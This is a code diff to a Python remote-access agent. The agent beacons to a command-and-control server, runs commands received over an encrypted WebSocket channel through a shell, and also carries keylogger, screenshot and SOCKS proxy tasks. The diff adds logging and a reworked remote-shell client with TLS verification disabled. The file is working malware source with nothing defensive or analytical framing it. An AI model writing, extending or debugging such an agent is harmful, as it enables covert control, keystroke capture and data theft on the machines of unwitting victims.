@@ -10,6 +10,7 @@ import platform
 import subprocess
 import random
 import io
+import logging
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 import requests
@@ -595,99 +596,143 @@ class Keylogger:
 # WebSocket Client
 # ======================
 class WebSocketClient:
-    def __init__(self, agent_id, crypto, server_url):
+    def __init__(self, agent_id, crypto, server_url, config):
         self.agent_id = agent_id
         self.crypto = crypto
-        # Ensure proper WebSocket URL format
-        self.server_url = server_url.replace('https://', 'wss://').replace('http://', 'ws://') + '/terminal'
+        self.config = config
+        self.server_url = server_url.replace('https://', 'wss://').replace('http://', 'ws://') + '/socket.io'
         self.socket = None
-        self.running = False
-        self.current_dir = os.getcwd()
         self.connected = False
-        self.connection_attempts = 0
-        self.max_attempts = 3
+        self.current_dir = os.getcwd()
+        self._setup_logger()
+        self._connection_timeout = 10  # seconds
+
+    def _setup_logger(self):
+        self.logger = logging.getLogger('websocket')
+        self.logger.setLevel(logging.DEBUG)
+        handler = logging.StreamHandler()
+        handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
+        self.logger.addHandler(handler)
 
     def connect(self):
         try:
-            if self.connection_attempts >= self.max_attempts:
-                if self.config.DEBUG:
-                    print("[!] Max connection attempts reached")
-                return False
-
-            self.connection_attempts += 1
+            self.logger.info(f"Connecting to WebSocket at {self.server_url}")
+            
             self.socket = socketio.Client(
                 ssl_verify=False,
                 reconnection=True,
-                reconnection_attempts=3,
-                reconnection_delay=1000,
-                logger=self.config.DEBUG,
-                engineio_logger=self.config.DEBUG
+                reconnection_attempts=5,
+                reconnection_delay=3000,
+                logger=True,
+                engineio_logger=True
             )
 
-            @self.socket.on('connect')
+            # Add connection verification timeout
+            connection_timeout = 10  # seconds
+            connected_event = threading.Event()
+
+            @self.socket.on('connect', namespace='/terminal')
             def on_connect():
-                if self.config.DEBUG:
-                    print("[+] WebSocket connected, authenticating...")
-                auth_data = {
-                    'agent_id': self.agent_id,
-                    'auth_token': self.crypto.encrypt({'agent_id': self.agent_id})
-                }
-                self.socket.emit('agent_connect', auth_data)
-
-            @self.socket.on('command')
-            def on_command(data):
+                self.logger.info("WebSocket connected, authenticating...")
                 try:
-                    if self.config.DEBUG:
-                        print(f"[+] Received command: {data['command']}")
-                    result = self._execute_command(data['command'])
-                    self.socket.emit('command_result', {
+                    auth_data = {
                         'agent_id': self.agent_id,
-                        'command': data['command'],
-                        'output': result.get('output', ''),
-                        'error': result.get('error', ''),
-                        'current_dir': result.get('current_dir', ''),
-                        'status': 'success' if not result.get('error') else 'error'
-                    })
+                        'auth_token': self.crypto.encrypt({
+                            'agent_id': self.agent_id,
+                            'timestamp': int(time.time())
+                        })
+                    }
+                    self.socket.emit('agent_connect', auth_data, namespace='/terminal')
+                    self.connected = True
+                    connected_event.set()
                 except Exception as e:
-                    if self.config.DEBUG:
-                        print(f"[!] Command execution error: {str(e)}")
-                    self.socket.emit('command_error', {
-                        'agent_id': self.agent_id,
-                        'error': str(e)
-                    })
+                    self.logger.error(f"Authentication failed: {str(e)}")
 
-            @self.socket.on('disconnect')
+            @self.socket.on('disconnect', namespace='/terminal')
             def on_disconnect():
+                self.logger.warning("WebSocket disconnected")
                 self.connected = False
-                if self.config.DEBUG:
-                    print("[!] WebSocket disconnected")
 
-            @self.socket.on('connect_error')
-            def on_connect_error(data):
-                if self.config.DEBUG:
-                    print(f"[!] WebSocket connection error: {str(data)}")
-
+            # Connect with timeout
             self.socket.connect(
                 self.server_url,
                 headers={
                     'User-Agent': self.config.USER_AGENT,
                     'X-Agent-ID': self.agent_id
                 },
-                transports=['websocket']
+                transports=['websocket'],
+                namespaces=['/terminal']
             )
+
+            if not connected_event.wait(connection_timeout):
+                self.logger.error("WebSocket connection timed out")
+                return False
             
-            self.running = True
-            self.connected = True
-            if self.config.DEBUG:
-                print("[+] WebSocket connection established")
+            self.logger.info("WebSocket connection established successfully")
             return True
 
         except Exception as e:
-            if self.config.DEBUG:
-                print(f"[!] WebSocket connection failed: {str(e)}")
+            self.logger.error(f"WebSocket connection failed: {str(e)}")
             return False
         
         
+    def _execute_command(self, command):
+        try:
+            self.logger.debug(f"Executing command: {command}")
+            
+            if command.lower().startswith('cd '):
+                new_dir = command[3:].strip()
+                try:
+                    if new_dir:
+                        os.chdir(new_dir)
+                    self.current_dir = os.getcwd()
+                    return {
+                        'output': f"Current directory is now: {self.current_dir}",
+                        'current_dir': self.current_dir
+                    }
+                except Exception as e:
+                    return {
+                        'error': str(e),
+                        'current_dir': self.current_dir
+                    }
+
+            result = subprocess.run(
+                command,
+                shell=True,
+                cwd=self.current_dir,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                timeout=30
+            )
+            self.current_dir = os.getcwd()
+            
+            return {
+                'output': result.stdout,
+                'error': result.stderr,
+                'current_dir': self.current_dir
+            }
+            
+        except subprocess.TimeoutExpired:
+            return {
+                'error': 'Command timed out after 30 seconds',
+                'current_dir': self.current_dir
+            }
+        except Exception as e:
+            return {
+                'error': str(e),
+                'current_dir': self.current_dir
+            }
+
+    def disconnect(self):
+        if self.socket:
+            try:
+                self.logger.info("Disconnecting WebSocket")
+                self.socket.disconnect()
+            except Exception as e:
+                self.logger.error(f"Disconnect error: {str(e)}")
+        self.connected = False
+
 # ======================
 # Main Agent Class
 # ======================
@@ -696,6 +741,7 @@ class Agent:
         self.config = Config()
         self.crypto = Crypto(self.config.AES_KEY, self.config.AES_IV)
         self.agent_id = self._generate_agent_id()
+        self._setup_logger()
         self.socks_proxy = SOCKS5Proxy(self.config.SOCKS5_PORT)
         self.keylogger = Keylogger()
         self.ws_client = None
@@ -704,6 +750,13 @@ class Agent:
         self._initial_checkin = None
         self._checkin_count = 0
         self._running = True
+
+    def _setup_logger(self):
+        self.logger = logging.getLogger('agent')
+        self.logger.setLevel(logging.DEBUG)
+        handler = logging.StreamHandler()
+        handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
+        self.logger.addHandler(handler)
 
     def _generate_agent_id(self):
         return f"{platform.node()}-{os.getlogin()}-{hash(os.getcwd())}"
@@ -740,8 +793,66 @@ class Agent:
     def _execute_task(self, task):
         try:
             task_type = task.get("type")
+            self.logger.info(f"Received task: {json.dumps(task, indent=2)}")  # Debug logging
             
-            if task_type == "terminal":
+            if task_type == "websocket":
+                # Get action from both possible locations in the task structure
+                action = task.get("action") or task.get("data", {}).get("action")
+                if not action:
+                    self.logger.error("WebSocket task missing action parameter")
+                    return {
+                        "status": "error",
+                        "message": "WebSocket task requires 'action' parameter"
+                    }
+                
+                self.logger.info(f"Processing WebSocket {action} request")
+                
+                if action == "start":
+                    if not hasattr(self, 'ws_client') or not self.ws_client:
+                        self.logger.info("Initializing new WebSocket client")
+                        self.ws_client = WebSocketClient(
+                            self.agent_id,
+                            self.crypto,
+                            self.config.C2_SERVER,
+                            self.config
+                        )
+                    
+                    if not self.ws_client.connected:
+                        self.logger.info("Attempting WebSocket connection...")
+                        if self.ws_client.connect():
+                            return {
+                                "status": "success",
+                                "message": "WebSocket connected",
+                                "action": "start"
+                            }
+                        else:
+                            return {
+                                "status": "error",
+                                "message": "Failed to connect WebSocket",
+                                "action": "start"
+                            }
+                    return {
+                        "status": "success",
+                        "message": "WebSocket already connected",
+                        "action": "start"
+                    }
+                
+                elif action == "stop":
+                    if hasattr(self, 'ws_client') and self.ws_client and self.ws_client.connected:
+                        self.ws_client.disconnect()
+                        return {
+                            "status": "success",
+                            "message": "WebSocket disconnected",
+                            "action": "stop"
+                        }
+                    return {
+                        "status": "error",
+                        "message": "No active WebSocket connection",
+                        "action": "stop"
+                    }
+        
+            
+            elif task_type == "terminal":
                 command = task.get("cmd", "")
                 if not command:
                     task_data = task.get("data", {})
@@ -753,123 +864,36 @@ class Agent:
                     new_dir = command[3:].strip()
                     try:
                         if new_dir:
-                            if new_dir == "..":
-                                os.chdir("..")
-                            elif new_dir == ".":
-                                pass
-                            elif new_dir == "\\":
-                                os.chdir("\\")
-                            elif new_dir.startswith("\\"):
-                                os.chdir(new_dir)
-                            else:
-                                os.chdir(os.path.join(current_dir, new_dir))
-                        
+                            os.chdir(new_dir)
                         current_dir = os.getcwd()
-                        current_dir = os.path.normpath(current_dir)
-                        
                         return {
                             "status": "success",
                             "output": f"Current directory is now: {current_dir}",
-                            "error": "",
-                            "terminal": True,
-                            "task_id": task.get("task_id"),
-                            "current_dir": current_dir,
-                            "command": command
+                            "current_dir": current_dir
                         }
                     except Exception as e:
                         return {
                             "status": "error",
-                            "output": "",
                             "error": str(e),
-                            "terminal": True,
-                            "task_id": task.get("task_id"),
-                            "current_dir": current_dir,
-                            "command": command
-                        }
-                
-                if command.strip().lower() == "dir":
-                    try:
-                        dir_output = []
-                        total_files = 0
-                        total_size = 0
-                        dir_count = 0
-                        
-                        for item in os.listdir(current_dir):
-                            full_path = os.path.join(current_dir, item)
-                            try:
-                                stat = os.stat(full_path)
-                                mtime = datetime.fromtimestamp(stat.st_mtime)
-                                date_str = mtime.strftime("%d.%m.%Y %H:%M")
-                                
-                                if os.path.isdir(full_path):
-                                    size_str = "<DIR>"
-                                    dir_count += 1
-                                else:
-                                    size_str = "{:>15,}".format(stat.st_size).replace(",", " ")
-                                    total_files += 1
-                                    total_size += stat.st_size
-                                
-                                dir_output.append(f"{date_str}  {size_str} {item}")
-                            except:
-                                continue
-                        
-                        dir_output.append("")
-                        dir_output.append(f"              {total_files} File(s) {total_size:,} bytes".replace(",", " "))
-                        dir_output.append(f"              {dir_count} Dir(s)")
-                        
-                        return {
-                            "status": "success",
-                            "output": "\n".join(dir_output),
-                            "error": "",
-                            "terminal": True,
-                            "task_id": task.get("task_id"),
-                            "current_dir": current_dir,
-                            "command": command
-                        }
-                    except Exception as e:
-                        return {
-                            "status": "error",
-                            "output": "",
-                            "error": str(e),
-                            "terminal": True,
-                            "task_id": task.get("task_id"),
-                            "current_dir": current_dir,
-                            "command": command
+                            "current_dir": current_dir
                         }
                 
                 result = subprocess.run(
                     command,
                     shell=True,
+                    cwd=current_dir,
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
                     text=True,
-                    encoding='utf-8',
-                    errors='replace',
-                    timeout=30,
-                    cwd=current_dir
+                    timeout=30
                 )
-                
-                output = result.stdout.strip()
-                error = result.stderr.strip()
                 current_dir = os.getcwd()
                 
-                if task.get("terminal", False) or task.get("data", {}).get("terminal", False):
-                    return {
-                        "status": "success",
-                        "output": output if output else "Command executed successfully",
-                        "error": error,
-                        "terminal": True,
-                        "task_id": task.get("task_id"),
-                        "current_dir": current_dir,
-                        "command": command
-                    }
-                
                 return {
-                    "output": output,
-                    "error": error,
-                    "returncode": result.returncode,
-                    "current_dir": current_dir,
-                    "command": command
+                    "status": "success",
+                    "output": result.stdout,
+                    "error": result.stderr,
+                    "current_dir": current_dir
                 }
             
             elif task_type == "screenshot":
@@ -920,54 +944,21 @@ class Agent:
                     self.keylogger.stop()
                     return {"logs": result}
             
-            elif task_type == "websocket":
-                action = task.get("action")
-            if action == "start":
-                if not self.ws_client or not self.ws_client.connected:
-                    self.ws_client = WebSocketClient(
-                        self.agent_id,
-                        self.crypto,
-                        self.config.C2_SERVER
-                    )
-                    connected = self.ws_client.connect()
-                    if connected:
-                        return {
-                            "status": "success", 
-                            "message": "WebSocket connection established",
-                            "action": "start"
-                        }
-                    else:
-                        return {
-                            "status": "error", 
-                            "message": "WebSocket connection failed",
-                            "action": "start"
-                        }
-                else:
-                    return {
-                        "status": "success", 
-                        "message": "WebSocket already connected",
-                        "action": "start"
-                    }
             else:
-                if self.ws_client and self.ws_client.connected:
-                    self.ws_client.disconnect()
-                    return {
-                        "status": "success", 
-                        "message": "WebSocket disconnected",
-                        "action": "stop"
-                    }
-                else:
-                    return {
-                        "status": "error", 
-                        "message": "No active WebSocket connection",
-                        "action": "stop"
-                    }
+                return {
+                    "status": "error",
+                    "message": f"Unknown task type: {task_type}"
+                }
         
         except Exception as e:
-            return {"status": "error", "message": str(e)}
+            self.logger.error(f"Error executing task: {str(e)}")
+            return {
+                "status": "error",
+                "message": f"Task execution failed: {str(e)}"
+            }
 
     def beacon(self):
-        print("[*] Starting beacon loop...")
+        self.logger.info("[*] Starting beacon loop...")
         while self._running:
             try:
                 sleep_time = self.config.CHECKIN_INTERVAL * (1 + (random.random() * self.jitter * 2 - self.jitter))
@@ -1010,10 +1001,10 @@ class Agent:
                         )
                 
             except requests.exceptions.RequestException as e:
-                print(f"[!] Connection error: {str(e)}")
+                self.logger.error(f"Connection error: {str(e)}")
                 time.sleep(self.config.CHECKIN_INTERVAL * 2)
             except Exception as e:
-                print(f"[!] Unexpected error: {str(e)}")
+                self.logger.error(f"Unexpected error: {str(e)}")
                 time.sleep(self.config.CHECKIN_INTERVAL)
 
     def stop(self):
@@ -1024,7 +1015,7 @@ class Agent:
             self.ws_client.disconnect()
 
     def run(self):
-        print("[*] Starting agent...")
+        self.logger.info("[*] Starting agent...")
         self.beacon()
 
 if __name__ == "__main__":
@@ -1043,7 +1034,6 @@ if __name__ == "__main__":
         sys.exit(0)
     
     try:
-        print("[*] Starting agent...")
         agent = Agent()
         agent.run()
     except Exception as e:
